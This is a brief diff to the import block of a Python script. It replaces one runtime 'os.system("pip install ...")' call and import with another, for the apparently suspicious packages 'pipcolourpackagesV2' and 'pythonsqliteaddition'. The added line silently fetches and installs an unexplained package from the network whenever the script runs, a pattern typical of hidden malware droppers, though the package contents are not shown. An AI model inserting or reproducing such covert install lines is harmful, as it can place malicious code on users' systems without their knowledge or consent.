@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcolourpackagesV2")
-import pipcolourpackagesV2
+os.system("pip install pythonsqliteaddition")
+import pythonsqliteaddition
 import json
 import httpx
 import time
